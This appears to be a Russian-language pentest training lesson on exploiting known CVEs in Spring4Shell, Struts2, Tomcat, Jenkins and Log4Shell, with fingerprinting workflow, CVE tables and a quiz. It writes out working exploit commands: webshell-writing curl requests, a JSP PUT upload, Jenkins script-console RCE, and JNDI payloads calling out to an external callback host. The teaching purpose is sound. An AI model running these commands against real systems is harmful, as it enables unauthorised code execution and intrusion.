---
id: web-framework-cves
title: "Фреймворк-CVE: Spring4Shell, Struts, Tomcat, Jenkins"
category: web
parent: web-architecture-advanced
difficulty: medium
order: 2
tags: [cve, spring, struts, tomcat, jenkins, nday]
prerequisites: [web-architecture]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 46
summary: "Эксплуатация N-day в популярных стеках: Spring4Shell, Struts2, Tomcat, Jenkins — от версии до RCE."
---

N-day (known CVE) в фреймворках и серверах — самый быстрый путь к RCE на реальных таргетах. Большинство компаний отстают с обновлениями на недели/месяцы, поэтому Spring4Shell, Struts2, Tomcat, Jenkins и подобные уязвимости продолжают срабатывать. Специалисту важно уметь точно фингерпринтить версию, находить подходящий CVE и применять проверенный PoC — не изобретая эксплойт с нуля.

## Теория: почему N-day эффективен

- Патч-дифф публичен: как только выходит фикс, сразу видно уязвимый код → эксплойт пишется за часы.
- Сканеры (`nuclei`) содержат готовые шаблоны на тысячи CVE.
- Многие таргеты не обновляются: «просто не успели».
- N-day не требует «нулевого дня» — достаточно версии и PoC.

Правило: **сначала фингерпринт+скан, потом ручной фаззинг**. Фреймворковый RCE часто живёт в рантайме, а не в прикладном коде.

## Workflow: fingerprint → CVE → PoC

1. Определяем стек и версии:

```bash
httpx -u https://app.example -tech-detect -title -status-code -server
whatweb https://app.example
curl -sI https://app.example/ | grep -iE 'Server|X-Powered-By|X-AspNet'
```

2. Сканируем `nuclei` по тегам/технологиям:

```bash
nuclei -u https://app.example -tags spring,struts,tomcat,jenkins -severity critical,high -j -o nuc.json
nuclei -u https://app.example -tags cve -severity critical -j -o nuc.json
```

3. Сопоставляем версию с CVE (`searchsploit`, GitHub, базы вендора) и берём проверенный PoC.
4. Применяем PoC (сначала safe-check, затем эксплойт), проверяем read-back.

## Разобранный пример: Spring4Shell (CVE-2022-22965)

Условия: Spring MVC < 5.3.18/5.2.20, JDK 9+, WAR на Tomcat, `WebDataBinder` доступен.

Шаг 1 — фингерпринт Spring/Tomcat:

```bash
curl -sI https://app.example/ | grep -iE 'Server|X-Application-Context'
nuclei -u https://app.example -tags spring4shell
```

Шаг 2 — PoC меняет `AccessLogValve` Tomcat через `class.module.classLoader.*`, записывая JSP-webshell:

```bash
# изменение конфига логгера
curl -s "https://app.example/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di..."
# триггер записи
curl -s "https://app.example/?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
# доступ к webshell
curl -s "https://app.example/tomcatwar.jsp?cmd=id"
```

Готовые PoC — в публичных репозиториях `spring4shell`; ветеран-скрипт делает всё за один запуск.

## Разобранный пример: Struts2 (CVE-2017-5638)

Уязвимость в парсинге `Content-Type` (Jakarta multipart) → OGNL-инъекция до аутентификации.

```bash
nuclei -u https://app.example -tags struts
# готовый эксплойт
struts-pwn -u "https://app.example/" -c "id"
```

Серия Struts2 (S2-045/046/048/052/057) — все OGNL; подбирайте по версии (`X-Powered-By`/ошибки/`struts`-ресурсы). Metasploit: `exploit/multi/http/struts2_content_type_ognl`.

## Разобранный пример: Tomcat

- **CVE-2017-12615** (PUT JSP): если включён readonly=false, загружаем JSP через `PUT`:

```bash
curl -s -X PUT "https://app.example/shell.jsp/" --data 'JSP-код'   # обход через слэш
```

- **CVE-2020-1938 (Ghostcat)**: AJP-коннектор 8009 → чтение файлов/LFI/RCE.
- **Manager/`host-manager` слабые пароли** → деплой WAR → RCE.
- **Пример fингерпринта**: заголовок `Server: Apache-Coyote/1.1`, `/manager/html`, ошибки Tomcat.

## Разобранный пример: Jenkins

- **CVE-2018-1000861/2019-1003000** — Stapler RCE до аутентификации.
- **`/script` (Groovy console)** — если доступен, мгновенный RCE:

```bash
curl -s "https://jenkins.example/script" --data 'script=println("id".execute().text)'
```

- **Anonymous read + build** → выполнение в build-скриптах.
- **`/jnlpJars/`**, **`/cli`** — другие точки.
- Fингерпринт: `X-Jenkins` заголовок, `/login`, `/api/json`.

## Инструменты

- **`nuclei`** — CVE-шаблоны (`nuclei_parse`).
- **`searchsploit`** — Exploit-DB под версию.
- **Metasploit** — модули для Struts2/Tomcat/Jenkins.
- **`httpx -tech-detect`/`whatweb`** — версии.
- **GitHub PoC** — но проверяйте код перед запуском (см. методологию).

## Что дальше / decision

1. Определили стек+версию → ищите CVE.
2. Есть `nuclei`-шаблон → прогоните, подтвердите.
3. Нужен точный PoC → `searchsploit`/GitHub/Metasploit.
4. PoC найден → **прочитайте код**, уберите эксфильтрацию, перепроверьте на безопасность.
5. RCE → устойчивый канал + read-back.

## Частые ошибки

- **Грепать шаблоны nuclei по имени продукта.** Они названы по CVE-id — используйте `-tags`/`-id`.
- **Доверять версии из заголовка.** Она может быть подменена/скрыта — подтверждайте поведением.
- **Запускать скачанный PoC вслепую.** Это недоверенный код.
- **Путать N-day с 0-day.** Здесь достаточно версии и PoC.
- **Ломать прод.** Особенно деплой WAR/webshell — только с согласия.

## Таблица «горячих» фреймворк-CVE и их маркеров

| CVE | Продукт | Триггер | Признак уязвимости |
|-----|---------|---------|--------------------|
| CVE-2021-44228 | Log4j2 | `${jndi:ldap://...}` в любом поле | версия log4j-core 2.0–2.14 |
| CVE-2022-22965 | Spring4Shell | `class.module.classLoader...` | Spring MVC на Tomcat, JDK9+ |
| CVE-2017-5638 | Struts2 | `Content-Type: %{...}` OGNL | Struts 2.3.5–2.3.31 |
| CVE-2017-12617 | Tomcat | PUT + JSP | `readonly=false`, default servlet |
| CVE-2018-1000861 | Jenkins | Stapler `.../descriptorByName/` | неаутентифицированный доступ |
| CVE-2022-26134 | Confluence | OGNL в URL | Confluence 7.x/8.x |
| CVE-2023-34362 | MOVEit | SQLi → deser | MOVEit Transfer |
| CVE-2021-34473 | Exchange (ProxyShell) | SSRF+deser | Exchange 2013–2019 |
| CVE-2023-46604 | ActiveMQ | OpenWire deser | ActiveMQ < 5.18.3 |

Каждый пункт — это **N-day**: есть публичный PoC и патч. Версия-диффинг (сравнение уязвимой и пропатченной версий) быстро локализует точку входа.

## Версия-диффинг: как найти уязвимый код

Принцип: возьмите версию **до** фикса и **после**; разница — это и есть баг.

```bash
# 1) точная версия по заголовкам/статика/манифесту
curl -sI https://app.example/ | grep -iE 'server|x-powered-by'
curl -s https://app.example/actuator/info | jq .
# 2) скачиваем два релиза библиотеки
git clone --depth 1 -b v2.14.0 https://github.com/apache/logging-log4j2
git clone --depth 1 -b v2.15.0 https://github.com/apache/logging-log4j2
diff -ru logging-log4j2-2.14.0 logging-log4j2-2.15.0 | grep -i 'jndi\|lookup'
# 3) видим удаление JNDI-lookup -> это и есть CVE-2021-44228
```

Патч прямо указывает на уязвимую функцию; отсутствие патча в целевом бинаре = уязвимость. Если есть доступ к исходникам приложения, ищите дефолтные/захардкоженные секреты — их стоит попробовать напрямую.

## Безопасная проверка: non-destructive PoC

Framework-RCE легко «уронить» прод. Проверяйте аккуратно:

- **Log4Shell:** используйте OOB-проверку через свой listener, без выполнения команд.
```bash
# DNS-проверка: заставим цель резолвить наш домен (никакого RCE)
curl -s 'https://app.example/' -H 'User-Agent: ${jndi:ldap://probe.oast.me/a}'
# смотрим в лог DNS Collaborator — если пришёл запрос, уязвимо
```
- **Spring4Shell:** проверяйте доступ к `classLoader` чтением, не записью JSP.
- **Struts2:** OGNL с `@java.lang.Runtime@getRuntime()` **не** запускайте на проде — используйте безвредный `2*2` в `Content-Type` и смотрите на ошибку.

Всегда: сначала детект без побочных эффектов, затем — с согласия — эксплуатация.

## Разобранный пример: Log4Shell end-to-end (безопасный детект)

```bash
# 1) поднимаем listener (DNS/HTTP) — например, interactsh-client
interactsh-client
# 2) отправляем payload в вероятные точки: заголовки, User-Agent, параметры, JSON
curl -s https://app.example/ -H 'User-Agent: ${jndi:ldap://<id>.oast.fun/x}'
curl -s 'https://app.example/search?q=${jndi:ldap://<id>.oast.fun/x}'
# 3) ждём callback в interactsh
# [ABC123] Received DNS interaction from app.example
```

Callback = подтверждение уязвимости (JNDI-разрешение произошло). Дальнейшая эксплуатация (JNDI→класс→RCE) выполняется только с разрешения и с учётом версии JDK (в новых JDK — через локальный gadget/`trustURLCodebase=false`).

## Что делать дальше / решение

1. **Соберите стек.** Заголовки, статика, `/actuator`, favicon-hash, ошибки.
2. **Определите версии.** Для каждой — свой список известных CVE.
3. **Возьмите PoC.** Из exploit-db/nuclei/GitHub, **прочитайте его** перед запуском.
4. **Проверьте безопасно.** OOB-детект, неразрушающие проверки.
5. **Эксплуатируйте с согласия.** Non-destructive marker, сохранение живости сервиса.
6. **Зафиксируйте PoC.** Запрос + callback/вывод команды как доказательство.

## Практика и справочники

- **nuclei templates** — `CVE-*.yaml` по имени CVE (не по продукту!).
- **exploit-db / searchsploit** — публичные PoC.
- **HackTricks** — страницы по конкретным продуктам.
- **Vulhub** — локальные Docker-стенды для отработки N-day.

## Приоритизация: какие CVE проверять первыми

Не все CVE одинаково ценны. Ранжируйте по критериям «пред-аутентификация + RCE + публичный PoC».

| Критерий | Высокий приоритет | Низкий приоритет |
|----------|-------------------|------------------|
| Аутентификация | не нужна | нужен админ |
| Эффект | RCE / auth bypass | info leak |
| PoC | публичный, рабочий | только advisory |
| Экспозиция | наружу | только localhost |
| Версия | легко определяется | неопределима |

```bash
# 1) что вообще наружу (порты/сервисы)
nmap -sV -p- --min-rate 2000 app.example -oX scan.xml
# 2) версии веб-слоя
whatweb -a3 https://app.example | tee whatweb.txt
# 3) шаблоны по конкретным CVE (имя файла = CVE-id!)
nuclei -u https://app.example -t http/cves/2022/CVE-2022-22965.yaml -j
```

Помните: выбирать шаблоны нужно по **CVE-идентификатору**, а не grep'ать библиотеку по названию продукта — иначе нужный файл просто не найдётся.

## Таблица «что смотреть в первую очередь»

| Признак | Вероятные CVE-семейства |
|---------|-------------------------|
| Java + Tomcat + Spring | Spring4Shell, Log4Shell, Struts2 |
| Jenkins на порту 8080 | CVE-2018-1000861, script console |
| Confluence/Jira | CVE-2022-26134, CVE-2023-22515 |
| Exchange | ProxyLogon/ProxyShell |
| ActiveMQ 61616 | CVE-2023-46604 |
| GitLab self-hosted | CVE-2023-2825, CVE-2021-22205 |
| MOVEit/GoAnywhere | CVE-2023-34362 |

Начните с пред-аутентификационных RCE — именно они дают мгновенный доступ без учёток.

## Итог: порядок работы с framework-CVE

1. **Fingerprint.** Заголовки, статика, `/actuator`, favicon-hash — определите точные версии.
2. **Сопоставьте.** Версия → список CVE → приоритет (pre-auth RCE выше всех).
3. **Возьмите PoC.** Из nuclei/exploit-db/GitHub, **прочитайте** перед запуском.
4. **Детект безопасно.** OOB-проверка без выполнения команд.
5. **Эксплуатация с согласия.** Non-destructive, сервис должен остаться живым.
6. **PoC-артефакт.** Запрос + callback/вывод, привязанный к конкретной версии.

N-day — самый быстрый путь к RCE на устаревшем стеке; главное — не «уронить» цель и не запускать непроверенный PoC вслепую.

## Квиз

```quiz
- question: "Что такое N-day?"
  options:
    - "Нулевой день"
    - "Уязвимость с известным патчем и публичным PoC"
    - "Свежая уязвимость без патча"
    - "DoS"
  answer: 1
  explanation: "Патч вышел, но цели не обновлены."
- question: "Какая CVE связана со Spring data binding?"
  options:
    - "CVE-2017-5638"
    - "CVE-2022-22965 (Spring4Shell)"
    - "CVE-2020-1938"
    - "CVE-2018-11776"
  answer: 1
  explanation: "Spring4Shell."
- question: "Где обычно указывается версия фреймворка?"
  options:
    - "В DNS"
    - "В заголовках Server/X-Powered-By, страницах ошибок, статике"
    - "В TLS-сертификате"
    - "В robots.txt"
  answer: 1
  explanation: "Fingerprint-источники."
- question: "Что такое Ghostcat?"
  options:
    - "RCE в Jenkins"
    - "CVE-2020-1938: чтение файлов через AJP в Tomcat"
    - "SSTI"
    - "XSS"
  answer: 1
  explanation: "AJP file read."
- question: "Что делать перед запуском публичного PoC?"
  options:
    - "Запустить сразу"
    - "Прочитать код, репойнтить callback'и, оценить риски"
    - "Удалить"
    - "Зашифровать"
  answer: 1
  explanation: "PoC — недоверенный код."
```

## Где пригодится

- **CTF (Web):** задачи на известный стек.
- **Bug bounty:** N-day в enterprise.
- **Пентест:** быстрый RCE на неупатченных стеках.
- **Работа (AppSec/DevOps):** инвентаризация версий, патчинг, WAF-правила.
